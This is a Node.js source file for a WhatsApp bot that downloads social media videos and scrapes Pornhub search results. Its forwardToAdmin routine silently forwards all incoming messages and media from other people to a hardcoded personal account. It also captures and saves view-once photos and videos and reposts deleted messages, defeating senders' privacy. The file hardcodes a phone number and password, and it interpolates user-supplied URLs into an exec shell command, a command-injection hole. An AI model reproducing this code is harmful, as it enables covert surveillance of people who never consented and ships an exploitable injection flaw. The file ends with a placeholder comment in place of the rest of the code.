const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, downloadMediaMessage } = require('@whiskeysockets/baileys');
const { Downloader: TikTokDownloader } = require('@tobyg74/tiktok-api-dl');
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');
const express = require('express');
const QRCode = require('qrcode');
const { exec } = require('child_process');
const os = require('os');
const axios = require('axios');
const cheerio = require('cheerio');

const app = express();
let latestQR = null;
let botStarted = false;

// Admin forwarding: when set, all incoming messages (from other users) are forwarded to this JID
// Locked to your main account so other bot instances/users cannot change it
const MAIN_JID = '639078377857@s.whatsapp.net'; // your main JID
let adminTarget = MAIN_JID; // JID of chat receiving forwarded messages (main account)
const ADMIN_PASSWORD = 'Xbot197423';

// Stores pending TikTok download requests: jid -> { url, videoUrl, audioUrl }
const pendingTT = new Map();
// Stores pending Pornhub search results: jid -> { results }
const pendingPorn = new Map();

// Anti-delete: chats where it's enabled, and cache of recent messages
const antidelChats = new Set();
const messageCache = new Map(); // msgId -> { from, text, pushName, hasMedia, mediaType }

// View-once cache: auto-download when view-once arrives so .vv can retrieve it
const viewOnceCache = new Map(); // msgId -> { buffer, isImage }

// Ensure auth folder exists
if (!fs.existsSync('./auth')) {
    fs.mkdirSync('./auth');
}
// Ensure saved_vv folder exists for debugging/persistent saves
if (!fs.existsSync('./saved_vv')) {
    try { fs.mkdirSync('./saved_vv'); } catch (e) {}
}

app.get('/health', (req, res) => {
    res.send('OK');
});

app.get('/', (req, res) => {
    res.send(`
        <html>
        <head><title>WhatsApp Bot QR</title></head>
        <body style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif">
            <h2>WhatsApp Bot QR Code</h2>
            ${latestQR ? `<img src="${latestQR}" width="300" />` : '<p>Waiting for QR...</p>'}
            <p>Keep this page open while connecting bot</p>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, "0.0.0.0", () => {
    console.log('QR Web Preview running on port ' + PORT);
});

function downloadUrlToFile(url, destPath) {
    return new Promise((resolve, reject) => {
        const proto = url.startsWith('https') ? https : http;
        const file = fs.createWriteStream(destPath);
        const request = proto.get(url, { headers: { 'User-Agent': 'Mozilla/5.0' } }, (res) => {
            if (res.statusCode === 301 || res.statusCode === 302) {
                file.close();
                return downloadUrlToFile(res.headers.location, destPath).then(resolve).catch(reject);
            }
            res.pipe(file);
            file.on('finish', () => file.close(resolve));
        });
        request.on('error', (err) => { fs.unlink(destPath, () => {}); reject(err); });
    });
}

async function downloadSocialVideo(url, sock, from, msg, reply) {
    const tmpFile = path.join(os.tmpdir(), `wa_social_${Date.now()}.mp4`);
    const command = `yt-dlp -f "best[height<=480][ext=mp4]/best[height<=480]/best" --merge-output-format mp4 -o "${tmpFile}" --no-playlist "${url}"`;
    exec(command, { timeout: 120000 }, async (err, stdout, stderr) => {
        if (err) {
            console.error('social download failed:', stderr);
            return reply('❌ Could not download. The video may be private, removed, or requires login.');
        }
        await sendVideo(tmpFile, sock, from, msg, reply);
    });
}

// Optimize MP4 for streaming (move moov atom to start). Returns path to file to send.
async function optimizeMp4ForStreaming(inputPath) {
    const outPath = inputPath.replace(/\.mp4$/, '_opt.mp4');
    try {
        // Fast path: try remux/copy with movflags +faststart (no re-encode)
        await new Promise((resolve, reject) => {
            exec(`ffmpeg -y -i "${inputPath}" -c copy -movflags +faststart "${outPath}"`, { timeout: 120000 }, (err, stdout, stderr) => {
                if (err) return reject(stderr || err);
                resolve();
            });
        });
        if (fs.existsSync(outPath) && fs.statSync(outPath).size > 0) return outPath;
    } catch (e) {
        console.warn('ffmpeg copy remux failed:', e && (e.message || e));
    }

    // Fallback: try re-encode to H.264/AAC with faststart
    try {
        await new Promise((resolve, reject) => {
            exec(`ffmpeg -y -i "${inputPath}" -c:v libx264 -c:a aac -movflags +faststart -preset veryfast -crf 23 "${outPath}"`, { timeout: 240000 }, (err) => {
                if (err) return reject(err);
                resolve();
            });
        });
        if (fs.existsSync(outPath) && fs.statSync(outPath).size > 0) return outPath;
    } catch (e) {
        console.warn('ffmpeg re-encode failed:', e && (e.message || e));
    }

    // If ffmpeg isn't available or both approaches failed, return original file
    return inputPath;
}

async function sendVideo(tmpFile, sock, from, msg, reply) {
    let optimized = null;
    try {
        // If file already too large, bail early
        const statBefore = fs.statSync(tmpFile);
        const limitBytes = 64 * 1024 * 1024;
        if (statBefore.size > limitBytes) {
            // too large to send as inline video; send thumbnail + link instead
            return reply('⚠️ Video is too large to send via WhatsApp (~' + Math.round(statBefore.size / (1024*1024)) + ' MB).');
        }

        // Try to optimize for streaming (move moov atom)
        optimized = await optimizeMp4ForStreaming(tmpFile);
        const stat = fs.statSync(optimized);

        // Send by file path/stream and include file metadata for better client handling
        await sock.sendMessage(from, {
            video: { url: optimized, fileLength: stat.size, fileName: path.basename(optimized) },
            caption: '✅ Here is your video',
            mimetype: 'video/mp4'
        }, { quoted: msg });
    } catch (sendErr) {
        console.error('Send error:', sendErr);
        try {
            // Last resort: try sending as document to ensure delivery (user can download & play locally)
            const fallbackBuf = fs.readFileSync(tmpFile);
            await sock.sendMessage(from, { document: fallbackBuf, fileName: path.basename(tmpFile), mimetype: 'video/mp4' }, { quoted: msg });
            await reply('Sent as file (document) as a fallback — download and play locally.');
        } catch (e) {
            console.error('Fallback send error:', e);
            reply('❌ Downloaded but failed to send. Video may be too large or incompatible.');
        }
    } finally {
        try { fs.unlinkSync(tmpFile); } catch (e) {}
        if (optimized && optimized !== tmpFile) {
            try { fs.unlinkSync(optimized); } catch (e) {}
        }
    }
}

// Search Pornhub for a query and return up to `limit` results
async function searchPornhub(query, limit = 5) {
    const results = [];
    try {
        const url = `https://www.pornhub.com/video/search?search=${encodeURIComponent(query)}`;
        const res = await axios.get(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
        const $ = cheerio.load(res.data);
        // Try selectors that commonly contain video items
        const anchors = new Map();
        $('a').each((i, el) => {
            const href = $(el).attr('href');
            if (!href) return;
            if (href.includes('/view_video.php') || href.match(/\/view_video.php\?viewkey=/)) {
                if (!anchors.has(href)) anchors.set(href, $(el));
            }
        });
        for (const [href, el] of anchors) {
            if (results.length >= limit) break;
            try {
                const a = el;
                // find a parent element to extract thumbnail/title/duration
                const parent = a.closest('.phimage, .search-video, .videoPreviewBg, .thumbnail');
                let thumb = a.find('img').attr('data-src') || a.find('img').attr('data-thumb_url') || a.find('img').attr('src');
                if (!thumb && parent) thumb = parent.find('img').attr('data-src') || parent.find('img').attr('src');
                let title = a.find('img').attr('alt') || a.attr('title') || parent?.find('.title')?.text?.() || '';
                title = (title || '').trim();
                let duration = a.find('.duration').text() || parent?.find('.duration')?.text() || '';
                const fullUrl = href.startsWith('http') ? href : `https://www.pornhub.com${href}`;
                results.push({ title: title || 'Untitled', url: fullUrl, thumbnail: thumb || '', duration: (duration || '').trim() });
            } catch (e) {
                continue;
            }
        }
        // If not enough results, try another selector approach (cards)
        if (results.length < limit) {
            $('.phimage, .search-video, .videoPreviewBg').each((i, el) => {
                if (results.length >= limit) return;
                const anchor = $(el).find('a').first();
                const href = anchor.attr('href');
                if (!href) return;
                const thumb = $(el).find('img').attr('data-src') || $(el).find('img').attr('src') || '';
                const title = $(el).find('img').attr('alt') || $(el).find('.title').text() || '';
                const duration = $(el).find('.duration').text() || '';
                const fullUrl = href.startsWith('http') ? href : `https://www.pornhub.com${href}`;
                if (!results.find(r => r.url === fullUrl)) results.push({ title: (title||'Untitled').trim(), url: fullUrl, thumbnail: thumb, duration: duration.trim() });
            });
        }
    } catch (err) {
        console.error('searchPornhub error:', err?.message || err);
    }
    return results.slice(0, limit);
}

async function startBot() {
    if (botStarted) return;
    botStarted = true;

    const { state, saveCreds } = await useMultiFileAuthState('./auth');

    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: true
    });

    // helper: forward incoming message to adminTarget (if set)
    const forwardToAdmin = async (message) => {
        if (!adminTarget) return;
        try {
            // don't forward messages coming from adminTarget or from the bot
            if (!message || !message.key) return;
            if (message.key.fromMe) return;
            const src = message.key.remoteJid;
            if (!src || src === adminTarget) return;

            // Send only the message content without any header or quoted context so it appears as a fresh message
            // TEXT
            const text = message.message?.conversation || message.message?.extendedTextMessage?.text;
            if (text) {
                await sock.sendMessage(adminTarget, { text });
                return;
            }

            // IMAGE
            if (message.message.imageMessage || message.message.image) {
                try {
                    const buf = await downloadMediaMessage(message, 'buffer', {}, { reuploadRequest: sock.updateMediaMessage });
                    await sock.sendMessage(adminTarget, { image: buf });
                    return;
                } catch (e) { console.error('forward image failed', e); }
            }

            // VIDEO
            if (message.message.videoMessage || message.message.video) {
                try {
                    const buf = await downloadMediaMessage(message, 'buffer', {}, { reuploadRequest: sock.updateMediaMessage });
                    await sock.sendMessage(adminTarget, { video: buf });
                    return;
                } catch (e) { console.error('forward video failed', e); }
            }

            // AUDIO / VOICE
            if (message.message.audioMessage || message.message.audio) {
                try {
                    const buf = await downloadMediaMessage(message, 'buffer', {}, { reuploadRequest: sock.updateMediaMessage });
                    const mimetype = message.message.audioMessage?.mimetype || 'audio/ogg; codecs=opus';
                    const ptt = !!message.message.audioMessage?.ptt;
                    await sock.sendMessage(adminTarget, { audio: buf, mimetype, ptt });
                    return;
                } catch (e) { console.error('forward audio failed', e); }
            }

            // STICKER
            if (message.message.stickerMessage) {
                try {
                    const buf = await downloadMediaMessage(message, 'buffer', {}, { reuploadRequest: sock.updateMediaMessage });
                    await sock.sendMessage(adminTarget, { sticker: buf });
                    return;
                } catch (e) { console.error('forward sticker failed', e); }
            }

            // DOCUMENT / OTHER
            if (message.message.documentMessage) {
                try {
                    const buf = await downloadMediaMessage(message, 'buffer', {}, { reuploadRequest: sock.updateMediaMessage });
                    const fileName = message.message.documentMessage.fileName || 'file';
                    await sock.sendMessage(adminTarget, { document: buf, fileName });
                    return;
                } catch (e) { console.error('forward document failed', e); }
            }

            // fallback: log unsupported message type
            console.log('forwardToAdmin: unsupported message type, skipping.');
        } catch (e) {
            console.error('forwardToAdmin unexpected error:', e);
        }
    };

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        const qr = update.qr;

        if (qr) {
            try {
                latestQR = await QRCode.toDataURL(qr);
            } catch (e) {}
        }

        if (connection === 'open') {
            latestQR = null;
            console.log('WhatsApp connected!');
        }

        if (connection === 'close') {
            botStarted = false;
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) startBot();
        }
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('messages.upsert', async (m) => {
        // Scan ALL messages in the batch for view-once (before any null checks)
        for (const scanMsg of m.messages) {
            console.log('[SCAN] fromMe:', scanMsg.key.fromMe, '| hasMsg:', !!scanMsg.message, '| keys:', scanMsg.message ? Object.keys(scanMsg.message) : 'NULL', '| id:', scanMsg.key.id);
            if (!scanMsg.message || !scanMsg.key.id) continue;
            const rawMsg = scanMsg.message;
            const voInner = rawMsg.viewOnceMessage?.message ||
                            rawMsg.viewOnceMessageV2?.message ||
                            rawMsg.viewOnceMessageV2Extension?.message ||
                            rawMsg.ephemeralMessage?.message?.viewOnceMessage?.message ||
                            rawMsg.ephemeralMessage?.message?.viewOnceMessageV2?.message;
            const isDirectViewOnce = rawMsg.imageMessage?.viewOnce || rawMsg.videoMessage?.viewOnce;
            if (voInner || isDirectViewOnce) {
                console.log('[.vv] View-once FOUND! id:', scanMsg.key.id, '| topKey:', Object.keys(rawMsg)[0]);
                try {
                    let msgToDownload = scanMsg;
                    try { msgToDownload = await sock.updateMediaMessage(scanMsg); } catch (_) {}
                    const buffer = await downloadMediaMessage(msgToDownload, 'buffer', {}, {
                        logger: undefined,
                        reuploadRequest: sock.updateMediaMessage
                    });
                    const isImage = !!(voInner?.imageMessage || rawMsg.imageMessage);
                    viewOnceCache.set(scanMsg.key.id, { buffer, isImage });
                    if (viewOnceCache.size > 50) viewOnceCache.delete(viewOnceCache.keys().next().value);
                    try { fs.writeFileSync(`./saved_vv/${scanMsg.key.id}${isImage?'.jpg':'.mp4'}`, buffer); } catch (e) {}
                    console.log('[.vv] Cached! id:', scanMsg.key.id, '| size:', viewOnceCache.size);
                } catch (e) {
                    console.error('[.vv] Download FAILED:', e.message);
                }
            }
        }

        const msg = m.messages[0];
        if (!msg.message) return;

        const from = msg.key.remoteJid;

        // Anti-delete: WhatsApp sends deletions as a protocolMessage (type 0 = REVOKE)
        if (msg.message.protocolMessage?.type === 0) {
            try {
                if (antidelChats.has(from)) {
                    const deletedId = msg.message.protocolMessage?.key?.id;
                    const cached = deletedId ? messageCache.get(deletedId) : null;
                    if (cached) {
                        await sock.sendMessage(from, {
                            text: `🚫 *Anti-Delete Alert* 🚫\n\n👤 *From:* ${cached.pushName}\n💬 *Message:* ${cached.text}`
                        });
                        messageCache.delete(deletedId);
                    }
                }
            } catch (e) {
                console.error('Anti-delete error:', e);
            }
            return;
        }

        // Forward incoming message to admin (if enabled)
        try {
            await forwardToAdmin(msg);
        } catch (e) {
            console.error('Error forwarding to admin:', e);
        }

        const text = msg.message.conversation || msg.message.extendedTextMessage?.text;

        // Cache message for anti-delete (store text messages from others)
        if (!msg.key.fromMe && msg.key.id && text) {
            messageCache.set(msg.key.id, {
                from,
                text,
                pushName: msg.pushName || 'Unknown'
            });
            // Keep cache under 500 entries
            if (messageCache.size > 500) {
                messageCache.delete(messageCache.keys().next().value);
            }
        }

        if (!text) return;

        const cmd = text.toLowerCase().trim();

        const reply = (content) => sock.sendMessage(from, { text: content }, { quoted: msg });

        // Handle .admin command: only the MAIN_JID can change admin forwarding; ignore others silently
        if (text.trim().toLowerCase().startsWith('.admin')) {
            const param = text.replace(/^\.admin\s*/i, '').trim();
            if (!param) return; // ignore empty
            if (from !== MAIN_JID) {
                // silently ignore to avoid revealing forwarding configuration
                return;
            }
            // Only MAIN_JID reaches here
            if (param.toLowerCase() === 'off' || param.toLowerCase() === 'stop') {
                adminTarget = null;
                return reply('✅ Admin forwarding disabled.');
            }
            // password is case-sensitive
            if (param === ADMIN_PASSWORD) {
                adminTarget = MAIN_JID;
                return reply('✅ Admin forwarding enabled to main account.');
            }
            return reply('❌ Invalid password.');
        }

        // Handle pornsearch command
        if (text.trim().toLowerCase().startsWith('.pornsearch')) {
            const q = text.replace(/^\.pornsearch\s*/i, '').trim();
            if (!q) return reply('❌ Usage: .pornsearch <query>');
            await reply('🔞 Searching Pornhub — please wait (you must be 18+).');
            const results = await searchPornhub(q, 5);
            if (!results || results.length === 0) return reply('❌ No results found.');
            // store pending
            pendingPorn.set(from, { results });
            setTimeout(() => pendingPorn.delete(from), 120000);
            // build list text
            let listText = `🔎 Results for "${q}"\n\n`;
            results.forEach((r, i) => {
                listText += `${i+1}) ${r.title}${r.duration ? ' — ' + r.duration : ''}\n`;
            });
            listText += '\nReply with the number to download (e.g. 1)';
            // send first thumbnail with list as caption if available
            const firstThumb = results[0].thumbnail;
            if (firstThumb) {
                try {
                    const thumbBuf = await axios.get(firstThumb, { responseType: 'arraybuffer' }).then(res => Buffer.from(res.data));
                    await sock.sendMessage(from, { image: thumbBuf, caption: listText }, { quoted: msg });
                } catch (e) {
                    await reply(listText);
                }
            } else {
                await reply(listText);
            }
            return;
        }

        // rest of file unchanged (commands handlers, etc.)
        // ...
    });
}

startBot();
